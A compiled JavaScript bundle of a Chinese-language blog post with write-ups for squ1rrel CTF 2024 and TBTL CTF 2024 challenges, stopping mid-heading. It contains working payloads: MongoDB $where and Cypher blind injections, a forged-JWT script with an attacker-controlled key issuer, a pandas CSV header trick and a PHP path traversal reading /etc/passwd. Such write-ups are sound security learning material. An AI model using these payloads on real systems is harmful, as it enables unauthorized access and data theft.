"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[7688],{7777:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>t,metadata:()=>r,toc:()=>a});var r=s(8758),i=s(4848),l=s(8453);const t={title:"squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)",authors:"RibomBalt",tags:["CTF"]},c="squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)",d={authorsImageUrls:[void 0]},a=[{value:"squ1rrel CTF 2024",id:"squ1rrel-ctf-2024",level:2},{value:"pwn - playground / revengeplay",id:"pwn---playground--revengeplay",level:3},{value:"web - goosemon",id:"web---goosemon",level:3},{value:"web - jsonstore",id:"web---jsonstore",level:3},{value:"web - keyserver",id:"web---keyserver",level:3},{value:"TBTL CTF 2024",id:"tbtl-ctf-2024",level:2},{value:"web - butterfly",id:"web---butterfly",level:3},{value:"web - Rnd For Data Science",id:"web---rnd-for-data-science",level:3},{value:"web - talk",id:"web---talk",level:3},{value:"web - mexico city tour",id:"web---mexico-city-tour",level:3},{value:"pwn - average",id:"pwn---average",level:3},{value:"pwn - races",id:"pwn---races",level:3},{value:"pwn - diamonds and rust",id:"pwn---diamonds-and-rust",level:3},{value:"pwn - heap peek and poke",id:"pwn---heap-peek-and-poke",level:3}];function o(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,l.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.p,{children:"\u90fd\u662f\u504f\u5165\u95e8\u5411\uff0c\u4e0d\u662f\u4e13\u4e1aCTF\uff0c\u6709\u4e9b\u9898\u6bd4\u8f83\u731c/\u85cf\uff0c\u4e0d\u8fc7\u786e\u5b9e\u6709\u4e00\u4e9b\u9898\u76ee\u6bd4\u8f83\u6709\u8da3"}),"\n",(0,i.jsx)(n.h2,{id:"squ1rrel-ctf-2024",children:"squ1rrel CTF 2024"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e2a\u6bd4\u8d5bpwn\u6ca1\u6709\u96be\u9898\uff08\u6700\u96be\u662f\u5199shellcode\uff0c\u5176\u4ed6\u5168\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32+\u6808\u6ea2\u51fa/ROP/GOT\u8868\u52ab\u6301\uff09\uff0cweb\u9898\u5168\u662fnodejs\u3002"}),"\n",(0,i.jsx)(n.h3,{id:"pwn---playground--revengeplay",children:"pwn - playground / revengeplay"}),"\n",(0,i.jsxs)(n.p,{children:["\u4e24\u4e2a\u5199shellcode\u7684\u9898\u76ee\u3002shellcode\u672c\u8eab\u6ca1\u6709\u9650\u5236\uff0c\u4f46\u6709seccomp\u6c99\u7bb1\u89c4\u5219\uff0c\u7981\u7528\u4e86\u7edd\u5927\u591a\u6570\u7cfb\u7edf\u8c03\u7528\uff08\u5305\u62ecopen read mmap ptrace\u7b49\u7b49\u548c\u6587\u4ef6\u64cd\u4f5c\u6709\u5173\u7684\u8c03\u7528\uff09\uff0c\u4f46\u662fexecve\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u67d0\u4e2a\u5730\u5740\u7684\u65f6\u5019\u53ef\u4ee5\u653e\u884c\uff08\u7b2c\u4e00\u95ee\u662f\u5806\u5730\u5740\uff0c\u7b2c\u4e8c\u95ee\u662fbss\u6bb5\uff09\u3002flag\u5305\u542b\u5728",(0,i.jsx)(n.code,{children:"/getflag"}),"\u8fd9\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\u91cc\uff0c\u6267\u884c\u5b83\u6216\u8005\u6253\u5370\u5b83\u90fd\u53ef\u4ee5\u5f97\u5230flag\u3002\u7136\u800c\u8fd9\u4e2a\u9898\u5728\u8fdb\u5165shellcode\u524d\u4f1a\u628a\u6240\u6709\u5bc4\u5b58\u5668\u6e05\u7a7a\u4e3a0x42\uff0c\u540c\u65f6\u7a0b\u5e8f\u672c\u8eab\u5f00\u542f\u4e86PIE\uff0c\u6240\u4ee5\u8fd9\u4e2a\u9898\u7684\u6838\u5fc3\u662f\u5982\u4f55\u627e\u56de\u5730\u5740\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:" 0033: 0x15 0x00 0x04 0x0000003b  if (A != execve) goto 0038\n 0034: 0x20 0x00 0x00 0x00000014  A = filename >> 32 # execve(filename, argv, envp)\n 0035: 0x15 0x00 0x03 0x0000556b  if (A != 0x556b) goto 0039\n 0036: 0x20 0x00 0x00 0x00000010  A = filename # execve(filename, argv, envp)\n 0037: 0x15 0x00 0x01 0x490c7100  if (A != 0x490c7100) goto 0039\n 0038: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0039: 0x06 0x00 0x00 0x00000000  return KILL\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5076\u7136\u53d1\u73b0",(0,i.jsx)(n.code,{children:"brk"}),"\uff08\u8c03\u7528\u53f7\u4e3a12\uff09\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\u6ca1\u6709\u88ab\u7981\u7528\u3002\u6839\u636emanual\uff0cbrk\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5373\u4fee\u6539\u540e\u7684\u5806\u5730\u5740\uff0c\u6210\u529f\u8fd4\u56de0\uff0c\u5931\u8d25\u8fd4\u56de-1\u3002\u4f46\u662f\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5f53brk\u662f\u4e00\u4e2a\u4e0d\u5408\u7406\u7684\u503c\u65f6\uff0c\u8fd4\u56de\u503c\u5176\u5b9e\u662f\u5806\u7684\u7ed3\u675f\u5730\u5740\uff0c\u800c\u6211\u4eec\u77e5\u9053\u4e00\u822c\u60c5\u51b5\u4e0b\u5806\u7684\u5927\u5c0f\u9ed8\u8ba4\u662f",(0,i.jsx)(n.code,{children:"0x21000"}),"\uff0c\u6240\u4ee5\u53ef\u4ee5\u5f97\u5230\u5806\u8d77\u59cb\u5730\u5740\u3002\u90a3\u4e48\u7b2c\u4e00\u95ee\u5c31\u5f88\u5bb9\u6613\u5f97\u5230\u7ed3\u679c\u4e86\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u7b2c\u4e8c\u95ee\u5219\u662f\u8981\u5f97\u5230text\u6bb5\u5730\u5740\uff0c\u5806\u548ctext\u6bb5\u6709\u4e0d\u56fa\u5b9a\u7684\u504f\u79fb\uff0c\u4e0d\u8fc7\u597d\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u5806\u4e0a\u662f\u6709\u672a\u521d\u59cb\u5316\u7684text\u6bb5\u5730\u5740\u7684\uff08\u800c\u4e14\u6070\u597d\u5c31\u662fexecve\u767d\u540d\u5355\u5730\u5740\uff0c\u53ef\u80fd\u662f\u8c03\u7528seccomp\u65f6\u7559\u4e0b\u7684\uff09\uff0c\u6240\u4ee5\u5728\u5806\u4e0a\u904d\u5386\u5373\u53ef\u3002"}),"\n",(0,i.jsx)(n.h3,{id:"web---goosemon",children:"web - goosemon"}),"\n",(0,i.jsx)(n.p,{children:"\u53ea\u662f\u4e00\u4e2a\u767b\u9646\u754c\u9762\uff0c\u6709\u4e00\u4e2aadmin\u7528\u6237\uff0c\u5bc6\u7801\u662fflag\u3002\u6211\u4eec\u80fd\u591f\u6839\u636e\u56de\u663e\u7ed3\u679c\u5224\u65ad\u767b\u5f55\u6210\u529f\u6216\u8005\u5931\u8d25\u3002\u7528\u6237\u9a8c\u8bc1\u6570\u636e\u5e93\u662fmongodb\uff0c\u4f1a\u76f4\u63a5\u628a\u6211\u4eecpost\u8fdb\u53bb\u7684json\u653e\u8fdb\u53bb\u67e5\u8be2\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-js",children:'const db = client.db(dbName);\nconst collection = db.collection("users");\n\nconst data = collection.find(req.body);\nconst result = await data.toArray();\nif (result.length > 0) {\n    res.status(200).send("Login successful!");\n} else {\n    res.status(400).send("Login failed!");\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u770b\u8d77\u6765\u5c31\u662f\u4e00\u4e2a\u5e03\u5c14\u6ce8\u5165\uff0c\u4e3b\u8981\u7684\u70b9\u662fmongodb\u6709\u5f88\u591a\u9ad8\u7ea7\u67e5\u8be2\u8bed\u6cd5\uff08\u5e76\u4e0d\u53ea\u662f\u5b50\u7f00\u5339\u914d\uff09\u3002\u867d\u7136\u9898\u76ee\u8fc7\u6ee4\u4e86regex\uff0c\u4f46\u67e5\u8be2\u6587\u6863\u53ef\u4ee5\u77e5\u9053\u6709\u4e2a",(0,i.jsx)(n.code,{children:"$where"}),"\u5173\u952e\u5b57\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610fjavascript\u51fd\u6570\u3002\u4e0b\u9762\u8fd9\u4e2a\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u5bc6\u7801\u7684\u5e03\u5c14\u76f2\u6ce8"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-json",children:'{\n    "username": "admin",\n    "$where": "function (){return this.password[%d] == \'%s\';}" % (index, chr(c))\n}\n'})}),"\n",(0,i.jsx)(n.h3,{id:"web---jsonstore",children:"web - jsonstore"}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u7684\u540e\u7aef\u662fTAFFYDB\uff0c\u8fd9\u662f\u4e00\u4e2a\u6709",(0,i.jsx)(n.a,{href:"https://security.snyk.io/vuln/SNYK-JS-TAFFYDB-2992450",children:"\u5df2\u77e5CVE"}),"\uff0c\u4f46\u65e0\u4eba\u7ef4\u62a4\u7684\u6570\u636e\u5e93\u6a21\u5757\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"TAFFY\u5b58\u50a8\u7684\u90fd\u662fjson\u5bf9\u8c61\uff0c\u672c\u6765\u7684\u529f\u80fd\u662f\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u5b50json\uff0cTAFFY\u8fd4\u56de\u5305\u542b\u5b50json\u7684\u6240\u6709\u6761\u76ee\u3002\u4f46\u4e00\u65b9\u9762\u4e3b\u952e\u683c\u5f0f\u5b8c\u5168\u53ef\u4ee5\u88ab\u731c\u5230\uff0c\u53e6\u4e00\u65b9\u9762\u8fd8\u6709\u4e2a\u5185\u7f6e\u9009\u9879/\u540e\u95e8\u53ef\u4ee5\u5ffd\u7565\u4e3b\u952e\u4ee5\u5916\u7684\u6240\u6709\u5c5e\u6027\uff0c\u53ef\u4ee5\u5bfc\u81f4\u83b7\u53d6\u6570\u636e\u5e93\u4efb\u610f\u6761\u76ee\u3002\u76f4\u63a5\u7528CVE\u63d0\u4f9b\u7684poc\u5c31\u80fd\u6253\u901a\u4e86"}),"\n",(0,i.jsx)(n.h3,{id:"web---keyserver",children:"web - keyserver"}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u8d39\u7cbe\u529b\u7684\u4e00\u96c6\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u8fdc\u7aef\u4f7f\u7528RS256\u7684jwt\u9a8c\u8bc1\u6211\u4eec\u7684\u767b\u5f55\uff0c\u4f46\u662f\u8003\u8651\u4e86",(0,i.jsx)(n.code,{children:"jwt"}),"\u7684issuer\u5b57\u6bb5\uff0c\u5373\u4f1a\u4e3b\u52a8\u8bf7\u6c42\u5916\u90e8\u7684PEM\u516c\u94a5\u6587\u4ef6\u3002\u4f46\u662f\u9650\u5236\u4e86\u516c\u94a5Host\u5fc5\u987b\u4ee5",(0,i.jsx)(n.code,{children:"10."}),"\uff08\u5185\u90e8\u5730\u5740\uff09\u5f00\u5934\u3002\u7136\u540e\u4f1a\u7528fetch\u62ff\u5230\u516c\u94a5\u6587\u4ef6\uff08\u987a\u4fbf\u4e00\u63d0nodejs\u7684fetch\u662f\u4e0d\u652f\u6301file\u534f\u8bae\u7684\uff09"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-js",children:'let issuer;\ntry {\n    issuer = new URL(header.issuer);\n} catch (e) {\n    return res.status(401).send("Failed to parse URL");\n}\n\nif (!issuer.host.startsWith("10.")) {\n    return res.status(401).send("Invalid IP address");\n}\n\n// fetch public key from local key server\nlet publicKey;\ntry {\n    publicKey = await (await fetch(header.issuer)).text();\n} catch (e) {\n    return res.status(401).send("Failed to get public key");\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u4f2a\u9020JWT\u548c\u5bf9\u5e94\u516c\u94a5\u5f88\u7b80\u5355\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"if not os.path.isfile('tempkey'):\n    rsa_key = generate(1024)\n    priv_key = rsa_key.export_key()\n    pub_key = rsa_key.public_key().export_key()\n\n    with open('tempkey', 'wb') as fp:\n        fp.write(priv_key)\n\n    with open('tempkey.pub', 'wb') as fp:\n        fp.write(pub_key)\nelse:\n    with open('tempkey', 'rb') as fp:\n        priv_key = fp.read()\n\n    with open('tempkey.pub', 'rb') as fp:\n        pub_key = fp.read()\n\nHOST = 'http://34.132.166.199:5250/admin'\n\n# Need a controlable subdomain\nres_jwt = jwt.encode({'user': 'admin'}, priv_key, algorithm='RS256',\n            headers={\n                \"issuer\": \"http://10.test12345.strangled.net/K4n\"\n            })\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4f46\u6838\u5fc3\u5728\u4e8e\u5982\u4f55\u8ba9\u670d\u52a1\u5668\u5728\u8bbf\u95ee\u6211\u6307\u5b9a\u7684",(0,i.jsx)(n.code,{children:"10."}),"\u5f00\u5934\u7684issuer URL\u65f6\u80fd\u591f\u8fd4\u56de\u6211\u6307\u5b9a\u7684\u516c\u94a5\u8bc1\u4e66\uff1f\u663e\u7136\u4e3a\u4e86\u4e00\u4e2a\u5a31\u4e50\u5411\u7684CTF\u9898\u76ee\u4e70\u57df\u540d\u5f88\u4e0d\u73b0\u5b9e\uff0c\u4e0d\u8fc7\u597d\u5728\u8fd9\u79cd\u5b50\u57df\u540d\u670d\u52a1\u6709\u73b0\u6210\u7684\uff1a"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://freedns.afraid.org/subdomain/",children:"FreeDNS"}),": \u63d0\u4f9b\u51e0\u4e2a\u57df\u540d\u7684\u4efb\u610f\u5b50\u57df\u540d\u7684DNS\u89e3\u6790\uff1a","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"A\uff1a\u89e3\u6790\u5230IP\u5730\u5740"}),"\n",(0,i.jsx)(n.li,{children:"CNAME: \u89e3\u6790\u5230\u53e6\u4e00\u4e2a\u57df\u540d\uff0c\u53ef\u60dcFreeDNS\u4e0d\u652f\u6301\u8fd9\u6761"}),"\n",(0,i.jsx)(n.li,{children:"TXT\uff1a\u4f3c\u4e4e\u662f\u9644\u52a0\u4fe1\u606f\u7684\u89e3\u6790"}),"\n",(0,i.jsx)(n.li,{children:"URL: \u5176\u5b9e\u5c31\u662f\u7f51\u5740\u91cd\u5b9a\u5411\uff0c\u8fd9\u4e2a\u624d\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u4e0d\u8fc7\u867d\u7136FreeDNS\u80fd\u7533\u8bf7\u901a\u8fc7\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u89e3\u6790\u4e0d\u51fa\u6765\u3002"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"FreeDNS",src:s(4860).A+"",width:"555",height:"135"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.a,{href:"https://dash.redirhub.com/",children:"redirhub"}),"\uff1a\u77ed\u94fe\u63a5\u63d0\u4f9b\u5546\u3002\u5728\u53ef\u63a7\u57df\u540d\uff08\u9700\u8981\u4e00\u4e2aCNAME\u89e3\u6790\u6216\u8005A+TXT\u89e3\u6790\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u63d0\u4f9b\u77ed\u94fe\u63a5\u91cd\u5b9a\u5411\u670d\u52a1\uff08\u6709\u514d\u8d39\u6b21\u6570\u9650\u5236\u4e0d\u8fc7\u591f\u7528\uff0c\u4e0d\u884c\u8fd8\u53ef\u4ee5\u91cd\u65b0\u6ce8\u518c\uff09"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"redirhub",src:s(4274).A+"",width:"801",height:"878"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5b8c\u6210\u540e\uff0c\u8fc7\u51e0\u5206\u949f\uff0c\u57df\u540d\u5c31\u53ef\u4ee5\u8bbf\u95ee\u4e86\u3002\u91cd\u5b9a\u5411\u76ee\u6807\u662f\u552f\u4e00\u6307\u5b9a\u9759\u6001\u6587\u4ef6\u6258\u7ba1\u670d\u52a1",(0,i.jsx)(n.a,{href:"https://buuoj.cn/challenges#Linux%20Labs",children:"buuoj Linux Lab"})]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u987a\u4fbfFreeDNS\u63d0\u4f9b\u7684\u51e0\u4e2a\u57df\u540d\u88abEdge\u6807\u7ea2\u4e86\uff0c\u610f\u6599\u4e4b\u4e2d\uff0c\u8fd9\u79cd\u514d\u8d39\u670d\u52a1\u6302\u7684\u57fa\u672c\u90fd\u662f\u9493\u9c7c\u7f51\u7ad9\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"tbtl-ctf-2024",children:"TBTL CTF 2024"}),"\n",(0,i.jsx)(n.p,{children:"\u53ea\u770b\u4e86pwn\u548cweb\uff0cweb\u6ca1\u6709\u96be\u9898\uff0cpwn\u6709\u4e0d\u5c11\u975e\u4f20\u7edf\u610f\u4e49\u4e0a\u7684\u9898\uff08\u751a\u81f3\u5305\u62ec\u4e00\u4e2aPython\u6c99\u76d2\u9003\u9038\uff0c\u4e0d\u8fc7\u90a3\u4e2a\u592a\u96be\u4e86\u6ca1\u505a\uff09"}),"\n",(0,i.jsx)(n.h3,{id:"web---butterfly",children:"web - butterfly"}),"\n",(0,i.jsx)(n.p,{children:"\u4e0a\u6765\u5c31\u662f\u4e00\u4e2aJS antidebugger\uff0c\u5f97\u5148\u5173\u6389\u65ad\u70b9\u8c03\u8bd5\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u4e0d\u8fc7\u8fd9\u6837\u8fd9\u4e2a\u9898\u7684JS\u4ee3\u7801\u4e5f\u662f\u6df7\u6dc6\u8fc7\u7684\u4e86\uff0c\u53ea\u80fd\u770b\u770b\u5176\u4ed6\u5730\u65b9\uff1a"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["SessionStorage\u91cc\u6709\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"KEY=secret key is very secure"})]}),"\n",(0,i.jsxs)(n.li,{children:["LocalStorage\u91cc\u6709\u4e00\u4e2a\uff1a",(0,i.jsx)(n.code,{children:'execute={"code":"CryptoJS.AES.decrypt(CIPHERTEXT, KEY).toString(CryptoJS.enc.Utf8)"}'})]}),"\n",(0,i.jsxs)(n.li,{children:["IndexDB\u91cc\u6709\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"strangeStorage"}),"\u6570\u636e\u5e93\uff0c\u5305\u62ec\u4e00\u4e2aFLAG\u5b57\u6bb5\uff0c\u770b\u8d77\u6765\u662fBase64\u683c\u5f0f\uff08\u628a\u8fd9\u4e2aindexDB\u63d0\u53d6\u51fa\u6765\u597d\u8d39\u52b2\u554a\uff0c\u7ed3\u679c\u662f",(0,i.jsx)(n.code,{children:"U2FsdGVkX19wWL7itIL7TZcLTP/e1ulrZolI9AHTA8OBGOCodbZKdOxPF41rGV9C+X7PZPt9ISJKQMpTl+Fwew=="}),"\uff0c\u5373Salted__\u5f00\u5934\uff09"]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6240\u4ee5\u76f4\u63a5\u63a7\u5236\u53f0\u6267\u884c",(0,i.jsx)(n.code,{children:"CryptoJS.AES.decrypt('U2FsdGVkX19wWL7itIL7TZcLTP/e1ulrZolI9AHTA8OBGOCodbZKdOxPF41rGV9C+X7PZPt9ISJKQMpTl+Fwew==', 'secret key is very secure').toString(CryptoJS.enc.Utf8)"}),"\u5f97\u5230\u7ed3\u679c\u3002\u4e0d\u5f97\u4e0d\u8bf4\u6709\u70b9\u610f\u5473\u4e0d\u660e\u3002"]}),"\n",(0,i.jsx)(n.h3,{id:"web---rnd-for-data-science",children:"web - Rnd For Data Science"}),"\n",(0,i.jsxs)(n.p,{children:["\u57fa\u4e8e",(0,i.jsx)(n.code,{children:"pandas.readcsv"}),"\u51fa\u7684\u9898\uff0c\u6ca1\u6709\u5b8c\u5168\u5f04\u61c2\u4f46\u662f\u8499\u51fa\u6765\u4e86\u3002\u5927\u81f4\u610f\u601d\u662f\u4f1a\u5728\u751f\u6210\u7684CSV\u91cc\u6dfb\u52a0\u4e00\u884c",(0,i.jsx)(n.code,{children:"NaN,FLAG,{actual flag}"}),"\uff0c\u7136\u540e\u8fc7\u6ee4\u6389\u7b2c\u4e8c\u5217\u540d\u662fFLAG\u7684\u884c\u3002\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u5217\u540d\u548c\u5206\u9694\u7b26\uff0c\u4f46\u662f\u6709\u9ed1\u540d\u5355\uff0c\u4e0d\u80fd\u5305\u542b",(0,i.jsx)(n.code,{children:"'\"!@"}),"\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"# Filter out secrets\nfirst = list(df.columns.values)[1]\ndf = df.query(f'{first} != \"FLAG\"')\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u751f\u6210CSV header\u7684\u4ee3\u7801\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"headers = ['id'] + [request.form[\"columnName\" + str(i)] for i in range(num_columns)]\ncsv_file = delimiter.join(headers)\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u67e5\u8be2\u6587\u6863\u53ef\u4ee5\u77e5\u9053pandas\u7684\u5217\u540d\u6709\u4e9b\u5b57\u7b26\u662f\u6709\u7279\u6b8a\u542b\u4e49\u7684\uff0c\u9664\u4e86\u4e0a\u9762\u8fd9\u4e9b\uff0c\u8fd8\u6709",(0,i.jsx)(n.code,{children:"&|"}),"\u3002\u6bd4\u5982\u4e0b\u9762\u8fd9\u7ec4\uff1a"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"data = {\n    'numColumns': '2',\n    'columnName0': 'a',\n    'columnName1': 'a,b',\n    'delimiter': '|'\n}\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd4\u56de\u7684header\u7ed3\u679c\u4e3a\uff1a",(0,i.jsx)(n.code,{children:"id|a|a,b"}),"\uff0c\u5982\u679c\u76f4\u63a5\u8c03\u7528",(0,i.jsx)(n.code,{children:"read_csv"}),"\u4f1a\u628a",(0,i.jsx)(n.code,{children:"id|a|a"}),"\u5f53\u6210\u4e00\u5217\uff0c\u81ea\u7136\u627e\u7b2c\u4e8c\u5217\u662f\u627e\u4e0d\u5230FLAG\u7684\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'"id|a|a"|b\n"0|3|9"|\n"NaN|FLAG|TBTL{d4T4_5c13nc3_15_n07_f0r_r0ck135}"|\n'})}),"\n",(0,i.jsx)(n.h3,{id:"web---talk",children:"web - talk"}),"\n",(0,i.jsxs)(n.p,{children:["PHP LFI\u9898\u76ee\uff0c\u5bb9\u6613\u53d1\u73b0",(0,i.jsx)(n.code,{children:"https://tbtl-talk-to-you.chals.io/?page=xxx.html"}),"\u5b58\u5728\u6587\u4ef6\u5305\u542b\u64cd\u4f5c\uff0c\u5305\u542b",(0,i.jsx)(n.code,{children:"index.php"}),"\u53ef\u4ee5\u62a5\u9519\uff08\u8bf4\u660e\u662f\u53ef\u6267\u884c\u4ee3\u7801\u7684\uff09\uff0c\u7136\u540e\u672c\u5730requests\u53d1\u73b0\u53ef\u4ee5",(0,i.jsx)(n.code,{children:"../etc/passwd"}),"\u6587\u4ef6\u5305\u542b\uff08\u6d4f\u89c8\u5668\u4e0a\u4e0d\u884c\uff0c\u56e0\u4e3a\u8fd4\u56de\u7684\u6587\u4ef6\u6709\u4e00\u6bb5JS\u91cd\u5b9a\u5411\u56de\u5230\u4e3b\u9875\uff09"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7ecf\u8fc7\u4e00\u9635\u8270\u96be\u7684\u53d6\u8bc1\uff08\u731c\uff09\uff0c\u53d1\u73b0",(0,i.jsx)(n.code,{children:"/flag.txt"}),"\u5185\u5bb9\u662f",(0,i.jsx)(n.code,{children:'<p style="color: rgba(0, 0, 0, 0)">Flag is in SQLite3: database.sqlite</p>'}),"\uff0c\u4e00\u5f00\u59cb\u6ca1\u7406\u89e3\u5230\u610f\u601d\uff0c\u4e0d\u8fc7\u597d\u50cf\u662f\u8bf4",(0,i.jsx)(n.code,{children:"database.sqlite"}),"\u5c31\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u53d1\u73b0FLAG\u660e\u6587\u5305\u542b\u5728\u5176\u4e2d\u4e86\u3002\u8fd9\u4e2a\u9898\u51fa\u7684\u5b9e\u5728\u4e0d\u600e\u4e48\u597d\u3002\u5f88\u53ef\u60dc\u6ca1\u627e\u5230\u5305\u542b\u9a6c\u7684\u5730\u65b9\u6ca1\u6cd5RCE\u4e86\u3002"]}),"\n",(0,i.jsx)(n.h3,{id:"web---mexico-city-tour",children:"web - mexico city tour"}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u57fa\u4e8e",(0,i.jsx)(n.code,{children:"neo4j"}),"\u7684Cypher\u8bed\u8a00\uff0c\u8fd9\u662f\u4e00\u79cd\u56fe\u6570\u636e\u5e93\u8bed\u8a00\u3002\u9898\u76ee\u63cf\u8ff0\u4e2d\uff0cFLAG\u5728\u6570\u636e\u5e93\u7684\u67d0\u4e2a\u8282\u70b9\u7684\u67d0\u4e2a\u5b57\u6bb5\u91cc\u3002\u8fd9\u4e2a\u9898\u5bf9\u8f93\u5165\u662f\u76f4\u63a5\u62fc\u63a5\u7684\u5f62\u5f0f\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u6ce8\u5165\u3002\u4e0d\u8fc7\u8fd9\u4e2a\u9898\u53ea\u80fd\u56de\u663e\u4e00\u4e2a\u6570\u5b57\uff0c\u6211\u5728Cypher\u6587\u6863\u91cc\u4e5f\u6ca1\u627e\u5230\u5982\u4f55\u628a\u5b57\u7b26\u4e32\u8f6c\u4e3aASCII\u503c\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u53ea\u80fd\u6253\u5e03\u5c14\u76f2\u6ce8\u4e86\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5173\u4e8eCypher Injection\uff0c\u6211\u4e3b\u8981\u53c2\u8003\u4e86",(0,i.jsx)(n.a,{href:"https://pentester.land/blog/cypher-injection-cheatsheet",children:"\u8fd9\u7bc7\u535a\u5ba2"}),"\u548c",(0,i.jsx)(n.a,{href:"https://neo4j.com/docs/cypher-manual/current/introduction/",children:"\u5b98\u65b9\u6587\u6863"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"start = request.form[\"startStation\"]\nend = request.form['endStation']\ndistance_query = f'MATCH (n {{id: {start}}})-[p *bfs]-(m {{id: {end}}}) RETURN size(p) AS distance;'\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540e\u6211\u6784\u9020\u51fa\u6765\u7684\u6ce8\u5165\u8bed\u53e5\u5982\u4e0b\uff08\u90fd\u662f\u9010\u4e2aASCII\u904d\u5386\uff09\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"key_query = lambda ind, s: {\n    'startStation': '0})-[p *bfs]-(m {name: \\'FLAG\\'}) where substring(keys(m)[2], %d, 1)=\\'%s\\' RETURN 65537 AS distance; //' % (ind, s),\n    'endStation': '0',\n}\n\nflag_query = lambda ind, s: {\n    'startStation': '0})-[p *bfs]-(m {name: \\'FLAG\\'}) where substring(m.flag, %d, 1)=\\'%s\\' RETURN 65537 AS distance; //' % (ind, s),\n    'endStation': '0',\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7206\u51fa\u6765\u6570\u636e\u5e93\u6bcf\u4e2a\u8282\u70b9\uff08Station\u7c7b\u578b\uff09\u7684\u4e09\u4e2a\u5b57\u6bb5\u5206\u522b\u4e3aid, name, flag\uff08\u53ea\u6709\u7b2c\u4e09\u4e2a\u9700\u8981\u7206\u7834\uff0c\u524d\u4e24\u4e2a\u5728\u4ee3\u7801\u4e2d\u5df2\u77e5\uff09\uff0cFLAG\u6240\u5728\u8282\u70b9\u7684id\u4e3a-1\uff0cname\u4e3aFLAG\u3002\u7528where\u5b50\u53e5\u5f88\u5bb9\u6613\u6784\u9020\u5e03\u5c14\u76f2\u6ce8\uff0c\u8981\u4e48\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8981\u4e48\u6ca1\u6709\u8fd4\u56de\u503c\u3002"}),"\n",(0,i.jsx)(n.h3,{id:"pwn---average",children:"pwn - 